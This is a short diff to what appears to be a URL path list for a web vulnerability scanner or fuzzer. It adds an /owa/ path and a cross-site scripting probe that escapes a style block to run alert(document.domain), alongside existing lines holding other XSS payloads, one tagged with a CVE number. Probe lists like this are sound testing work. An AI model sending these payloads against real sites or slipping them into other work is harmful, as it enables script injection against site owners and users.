@@ -103,3 +103,5 @@
 /wp-login.php
 /srv/eng/catalog.search?uiconfig=%28alert%281%29%2C%7B%7D%29
 /ngg_tag/cve-2026-28141%22%3E%3Csvg%2Fonload%3Dalert%60{{marker}}%60%3E/
+/owa/
+/api/app-images/logo?color=red%7D%3C%2Fstyle%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%3Cstyle%3Ex%7B
